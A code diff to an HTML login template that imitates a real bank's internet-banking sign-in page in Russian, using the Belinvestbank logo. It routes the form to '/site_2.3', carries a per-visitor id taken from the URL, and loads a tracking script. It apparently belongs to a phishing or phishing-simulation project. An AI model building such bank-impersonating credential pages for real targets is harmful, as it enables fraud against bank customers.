@@ -5,7 +5,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Вход в интернет-банк</title>
-    <link rel="stylesheet" href="D:\April\tracking_project\static\css\style_2.3.css" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_2.3.css') }}">
+
 </head>
 
 <body>
@@ -13,17 +14,18 @@
     <img src="https://creditportal.by/images/virtuemart/manufacturer/belinvestbank.png" alt="Логотип" class="logo">
     <div class="login-box">
         <h1>Вход по логину и паролю</h1>
-        <form>
+        <form action="/site_2.3" method="get">
+            <input type="hidden" name="id" value="{{ request.args.get('id') }}">
             <div class="form-container">
 
-                <input type="text" placeholder="Логин" />
+                <input class="логин" type="text" placeholder="Логин" />
 
-                <input type="password" placeholder="Пароль" />
+                <input class="пароль" type="password" placeholder="Пароль" />
             </div>
             <h2>Способ получения сеансового ключа:</h2>
             <div class="radio-options">
-                <label><input type="radio" name="userType" value="client" checked /> SMS/PUSH-сообщением</label>
-                <label><input type="radio" name="userType" value="business" /> на E-mail</label>
+                <label><input class="SMS/PUSH-сообщением" type="radio" name="userType" value="client" checked /> SMS/PUSH-сообщением</label>
+                <label><input class="на E-mail" type="radio" name="userType" value="business" /> на E-mail</label>
             </div>
 
             <button type="submit" class="submit-btn">Войти</button>
@@ -31,6 +33,7 @@
 
         </form>
     </div>
+    <script src="{{ url_for('static', filename='js/track_example_2.js') }}"></script>
 </body>
 
 </html>
